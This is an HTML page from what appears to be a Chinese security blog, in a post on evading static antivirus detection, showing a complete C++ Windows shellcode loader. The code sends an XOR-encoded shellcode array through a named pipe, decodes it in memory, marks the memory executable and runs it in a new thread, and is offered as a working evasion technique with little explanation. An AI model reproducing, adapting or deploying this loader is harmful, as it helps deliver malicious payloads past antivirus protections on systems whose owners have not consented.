@@ -1,0 +1,705 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="unam4">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="分离0x01 管道接收shellcode何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。 通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。 1234567891011121314151617181920212223242526272829303132333">
+<meta property="og:type" content="article">
+<meta property="og:title" content="静态恶意代码逃逸(三)">
+<meta property="og:url" content="https://unam4.github.io/2024/06/08/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%B8%89/index.html">
+<meta property="og:site_name" content="unam4">
+<meta property="og:description" content="分离0x01 管道接收shellcode何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。 通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。 1234567891011121314151617181920212223242526272829303132333">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-06-08T12:41:17.000Z">
+<meta property="article:modified_time" content="2024-06-08T16:38:33.579Z">
+<meta property="article:author" content="unam4">
+<meta property="article:tag" content="免杀">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>静态恶意代码逃逸(三) - unam4</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"unam4.github.io","root":"/","version":"1.9.6","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>unam4&#39;s Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/01.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="静态恶意代码逃逸(三)"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-06-08 20:41" pubdate>
+          2024年6月8日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          268 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          3 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">静态恶意代码逃逸(三)</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="分离"><a href="#分离" class="headerlink" title="分离"></a>分离</h2><h3 id="0x01-管道接收shellcode"><a href="#0x01-管道接收shellcode" class="headerlink" title="0x01 管道接收shellcode"></a>0x01 管道接收shellcode</h3><p>何为管道：管道是通过网络来完成进程间的通信，它屏蔽了底层的网络协议细节。</p>
+<p>通常与Pipe相关的API都与管道有关，包括Cobaltstrike External C2也是用的管道进行进程通信，一般管道是一个公开的内核对象，所有进程都可以访问。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;intrin.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BUFF_SIZE 1024</span><br> <span class="hljs-type">char</span> buf[] =<br><span class="hljs-string">&quot;\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a&quot;</span><br><span class="hljs-string">&quot;\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5&quot;</span><br><span class="hljs-string">&quot;\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58&quot;</span><br><span class="hljs-string">&quot;\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb&quot;</span><br><span class="hljs-string">&quot;\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81&quot;</span><br><span class="hljs-string">&quot;\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09&quot;</span><br><span class="hljs-string">&quot;\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81&quot;</span><br><span class="hljs-string">&quot;\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e&quot;</span><br><span class="hljs-string">&quot;\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1&quot;</span><br><span class="hljs-string">&quot;\x87\x57\x60\x0b\x87\x8f\xb8\x0a\x0a\x0a\x5a\x62\x3b\x81\x65&quot;</span><br><span class="hljs-string">&quot;\x8d\xf5\xdf\xb1\xfa\xbf\xa8\x5c\x62\xac\x9f\xb7\x97\xf5\xdf&quot;</span><br><span class="hljs-string">&quot;\x36\x0c\x76\x00\x8a\xf1\xea\x7f\x0f\xb1\x4d\x19\x78\x65\x60&quot;</span><br><span class="hljs-string">&quot;\x0a\x59\xf5\xdf\x69\x6b\x66\x69\x24\x6f\x72\x6f\x0a&quot;</span>;<br> <span class="hljs-type">const</span> TCHAR* ptsPipeName = <span class="hljs-built_in">TEXT</span>(<span class="hljs-string">&quot;\\\\.\\pipe\\BadCodeTest&quot;</span>);<br><span class="hljs-function">BOOL <span class="hljs-title">RecvShellcode</span><span class="hljs-params">(VOID)</span> </span>&#123;<br>    HANDLE hPipeClient;<br>    DWORD dwWritten;<br>    DWORD dwShellcodeSize = <span class="hljs-built_in">sizeof</span>(buf);  <span class="hljs-comment">// 获取buf的大小作为shellcode的大小</span><br>    <span class="hljs-comment">// 等待管道可用</span><br>    <span class="hljs-built_in">WaitNamedPipe</span>(ptsPipeName, NMPWAIT_WAIT_FOREVER);  <span class="hljs-comment">// 等待命名管道可用</span><br>    <span class="hljs-comment">// 连接管道</span><br>    hPipeClient = <span class="hljs-built_in">CreateFile</span>(<br>        ptsPipeName,<br>        GENERIC_WRITE,<br>        FILE_SHARE_READ,<br>        <span class="hljs-literal">NULL</span>,<br>        OPEN_EXISTING,<br>        FILE_ATTRIBUTE_NORMAL,<br>        <span class="hljs-literal">NULL</span><br>    );  <span class="hljs-comment">// 创建文件句柄以连接到命名管道</span><br><br>    <span class="hljs-keyword">if</span> (hPipeClient == INVALID_HANDLE_VALUE) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Can&#x27;t Open Pipe , Error : %d \n&quot;</span>, <span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 无法打开管道，返回失败</span><br>    &#125;<br><br>    <span class="hljs-built_in">WriteFile</span>(hPipeClient, buf, dwShellcodeSize, &amp;dwWritten, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 将shellcode写入管道</span><br>    <span class="hljs-keyword">if</span> (dwWritten == dwShellcodeSize) &#123;<br>        <span class="hljs-built_in">CloseHandle</span>(hPipeClient);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Send Success ! Shellcode : %d Bytes\n&quot;</span>, dwShellcodeSize);<br>        <span class="hljs-keyword">return</span> TRUE;  <span class="hljs-comment">// 写入成功，返回成功</span><br>    &#125;<br>    <span class="hljs-built_in">CloseHandle</span>(hPipeClient);<br>    <span class="hljs-keyword">return</span> FALSE;  <span class="hljs-comment">// 写入失败，返回失败</span><br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, TCHAR* argv[])</span> </span>&#123;<br><br>    HANDLE hPipe;<br>    DWORD dwError;<br>    CHAR szBuffer[BUFF_SIZE];<br>    DWORD dwLen;<br>    PCHAR pszShellcode = <span class="hljs-literal">NULL</span>;<br>    DWORD dwOldProtect;  <span class="hljs-comment">// 用于存储内存页属性</span><br>    HANDLE hThread;<br>    DWORD dwThreadId;<br>    <span class="hljs-comment">// 创建命名管道</span><br>    hPipe = <span class="hljs-built_in">CreateNamedPipe</span>(<br>        ptsPipeName,<br>        PIPE_ACCESS_INBOUND,<br>        PIPE_TYPE_BYTE | PIPE_WAIT,<br>        PIPE_UNLIMITED_INSTANCES,<br>        BUFF_SIZE,<br>        BUFF_SIZE,<br>        <span class="hljs-number">0</span>,<br>        <span class="hljs-literal">NULL</span><br>    );<br><br>    <span class="hljs-keyword">if</span> (hPipe == INVALID_HANDLE_VALUE) &#123;<br>        dwError = <span class="hljs-built_in">GetLastError</span>();<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[-]Create Pipe Error : %d \n&quot;</span>, dwError);<br>        <span class="hljs-keyword">return</span> dwError;  <span class="hljs-comment">// 创建命名管道失败，返回错误码</span><br>    &#125;<br><br>    <span class="hljs-built_in">CreateThread</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, (LPTHREAD_START_ROUTINE)RecvShellcode, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 创建线程等待接收shellcode</span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">ConnectNamedPipe</span>(hPipe, <span class="hljs-literal">NULL</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Client Connected...\n&quot;</span>);<br>        <span class="hljs-built_in">ReadFile</span>(hPipe, szBuffer, BUFF_SIZE, &amp;dwLen, <span class="hljs-literal">NULL</span>);  <span class="hljs-comment">// 从管道中读取数据</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Get DATA Length : %d \n&quot;</span>, dwLen);<br>        <span class="hljs-comment">// 申请内存页</span><br>        pszShellcode = (PCHAR)<span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, dwLen, MEM_COMMIT, PAGE_READWRITE);  <span class="hljs-comment">// 在内存中分配空间</span><br>        <span class="hljs-comment">// 拷贝内存</span><br>        <span class="hljs-built_in">CopyMemory</span>(pszShellcode, szBuffer, dwLen);  <span class="hljs-comment">// 将数据复制到分配的内存中</span><br><br>        <span class="hljs-keyword">for</span> (DWORD i = <span class="hljs-number">0</span>; i &lt; dwLen; i++) &#123;<br>            <span class="hljs-comment">//Sleep(50);</span><br>            _InterlockedXor8(pszShellcode + i, <span class="hljs-number">10</span>);  <span class="hljs-comment">// 对内存中的数据进行异或操作</span><br>        &#125;<br><br>        <span class="hljs-comment">// 更改内存页属性为可执行</span><br>        <span class="hljs-built_in">VirtualProtect</span>(pszShellcode, dwLen, PAGE_EXECUTE, &amp;dwOldProtect);<br>        <span class="hljs-comment">// 执行Shellcode</span><br>        hThread = <span class="hljs-built_in">CreateThread</span>(<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-literal">NULL</span>,<br>            (LPTHREAD_START_ROUTINE)pszShellcode,<br>            <span class="hljs-literal">NULL</span>,<br>            <span class="hljs-literal">NULL</span>,<br>            &amp;dwThreadId<br>        );<br><br>        <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);  <span class="hljs-comment">// 等待线程执行完毕</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/" class="print-no-link">#免杀</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>静态恶意代码逃逸(三)</div>
+      <div>https://unam4.github.io/2024/06/08/静态恶意代码逃逸-三/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>unam4</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年6月8日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/06/04/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8-%E4%BA%8C/" title="静态恶意代码逃逸(二)">
+                        <span class="hidden-mobile">静态恶意代码逃逸(二)</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'unam4/unam4-commect');
+      s.setAttribute('issue-term', 'pathname');
+      
+      s.setAttribute('label', 'utterances');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
